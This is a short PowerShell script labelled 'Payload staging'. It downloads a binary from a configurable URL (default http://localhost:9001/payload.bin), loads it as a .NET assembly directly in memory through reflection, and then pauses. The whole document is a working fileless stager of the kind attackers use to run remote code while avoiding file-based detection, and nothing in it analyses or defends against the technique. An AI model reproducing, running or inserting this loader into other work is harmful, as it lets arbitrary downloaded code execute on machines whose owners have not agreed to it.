<# Payload staging #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://localhost:9001/payload.bin"
)
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData($PayloadUrl)
[Reflection.Assembly]::Load($ManagedBytes)
Start-Sleep -Seconds 26
